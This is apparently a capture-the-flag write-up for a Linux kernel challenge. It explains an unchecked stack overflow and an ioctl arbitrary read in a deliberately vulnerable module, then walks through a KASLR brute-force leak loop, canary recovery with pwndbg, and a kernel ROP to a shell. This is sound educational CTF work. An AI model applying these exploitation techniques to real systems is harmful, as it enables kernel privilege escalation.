# window-of-opportunity

**Protections**: `SMEP, SMAP, KASLR, KPTI`\
**Kernel vers**: `5.19.0-43-generic x86_64 GNU/Linux`

The kernel module registers a character device at `/dev/window` and implements four file operations `device_open`, `device_release`, `device_write`, and `device_ioctl`.

Among them `device_write` and `device_ioctl` looks sus, lets take a look at it. In `device_write` function the `size` parameter is not validated, it can be used to overflow the stack and write a ROP chain. But there is a canary which prevents us from overflowing it.

```c
ssize_t __fastcall device_write(file *file, const char *buf, size_t size, loff_t *offset)
{
  ...
  char a[64]; // [rsp+0h] [rbp-50h] BYREF
  ...
  copy_from_user(a, buf, size);
  ...
  return 0LL;
}
```

The other function `device_ioctl` gets a `request` object from user which holds a pointer and a message. The request object is copied to a stack buffer safely using `copy_from_user` then it uses the `ptr` member of request struct as `src` operand in `copy_to_function`

> __copy_to_user — Copy a block of data into user space, with less checking. Returns number of bytes that could not be copied. On success, this will be zero.

```c
typedef struct {
    unsigned long* ptr;
    char msg[256];
} request;

__int64 __fastcall device_ioctl(file *filp, __int64 cmd, unsigned __int64 arg)
{
  ...
  request req; // [rsp+0h] [rbp-120h] BYREF
  ...

  if ( (_DWORD)cmd == 0x1337 )
  {
    v5 = v4;
    copy_from_user(&req, v4, 0x108LL);
    result = (int)copy_to_user(v5 + 8, req.ptr, 0x100LL);
  }
  ...
  return result;
}
```


We've got Arbitrary read but what can we read, KASLR is enabled so we don't even know any valid address, or so I thought for two reasons: One `copy_to_user` would not *panic* if passed an invalid src address. So I quickly found a unique string `"68F2D50B-C469-4d8A-BD3D-941A103FD3FC"` from the kernel image and bruteforced the address until `device_ioctl` returned the string.

```c
unsigned long uuid_offset = 0x22c1e00;
for (kaslr = 0xffffffff00000000; kaslr < 0xfffffffffff00000; kaslr += 0x100000) {
    req->ptr = kaslr + uuid_offset;
    ioctl(fd, 0x1337, req);
    if (!strncmp("68F2D50B-C469-4d8A-BD3D-941A103FD3FC", req->msg, sizeof("68F2D50B-C469-4d8A-BD3D-941A103FD3FC"))) {
        break;
    }
}
```

And the second reason is, someone in Discord mentioned Kernel text can be leaked by reading the Interrupt Descriptor Table (IDT) which isn't affected by kaslr.

> [12:46 AM]nasm: And for the fixed address it's a pointer toward kernel .text around the IDT, given IDT isn't affected by kaslr (hxp used the same trick recently in one of their challenge https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/)

Awesome! Now that we have text address we can ROP?? No, we still have to find the canary of `device_write` function. So, the first thing I did was setting a break point at `device_write` and grab the actual canary. Then used the search feature in pwndbg to find the occurence of canary in memory.

```go
pwndbg> search -8 0xf13c6e5c78a13700
Searching for value: b'\x007\xa1x\\n<\xf1'
<pt>            0xffff888005a75750 0xf13c6e5c78a13700
<pt>            0xffff888005a759d8 0xf13c6e5c78a13700
<pt>            0xffff888005a75c38 0xf13c6e5c78a13700
<pt>            0xffff888005a75e30 0xf13c6e5c78a13700
<pt>            0xffff888005a75e88 0xf13c6e5c78a13700
<pt>            0xffff888005aba208 0xf13c6e5c78a13700
<pt>            0xffff88800f400028 0xf13c6e5c78a13700
<pt>            0xffff88800f405ce0 0xf13c6e5c78a13700
<pt>            0xffff88800f405dc0 0xf13c6e5c78a13700
<pt>            0xffffc90000003ce0 0xf13c6e5c78a13700
<pt>            0xffffc90000003dc0 0xf13c6e5c78a13700
<pt>            0xffffc90000653750 0xf13c6e5c78a13700
<pt>            0xffffc900006539d8 0xf13c6e5c78a13700
<pt>            0xffffc90000653c38 0xf13c6e5c78a13700
<pt>            0xffffc90000653e30 0xf13c6e5c78a13700
<pt>            0xffffc90000653e88 0xf13c6e5c78a13700
```

Address starting with `0xffffc9..` are stack address or somthing which as far as I know aren't leakable. Now we need to find a pointer in kernel bss which is in the same mapping as the above canary pointers. 

*This is where I wasted lots of hours calculating wrong offsets*

~~Soon~~ I found these pointers in bss which is in the same mapping as canary pointer.

```go
pwndbg> tele 0xffffffff83003c80
00:0000│  0xffffffff83003c80 —▸ 0xffff88800f431380 ◂— 0x100000
01:0008│  0xffffffff83003c88 —▸ 0xffff8880042d8080 ◂— 0x100000
```

I used the pointer at `0xffffffff83003c80` to leak the `<canary_ptr + offset>`. Again use the Arbitrary address read to leak the canary. And then a straight kROP using `device_write` to get a shell.

#### Post Exploitation
> [12:44 AM]nasm: But with an initramfs the whole fs is directly mapped into the physmap

Apparantely, the `initramfs` archive is [loaded into kernel memory](https://wiki.ubuntu.com/Initramfs#:~:text=The%20archive%20is%20simply%20unpacked%20into%20a%20ram%20disk.) at the start. So we could have just searched for `ictf{` string at somewhere near `kernel_text + 0x2c3b000` to get the flag.

A simple flag search in gdb would have shown the flag location, instead of wasting ~6 hrs looking at hex numbers.

References:
1. https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/
2. https://github.com/TrungNguyen1909/writeups/blob/master/matesctf/KSMASH/exploit.c
3. https://wiki.ubuntu.com/Initramfs

Twitter: [ShuntIsReal](https://twitter.com/ShuntIsReal)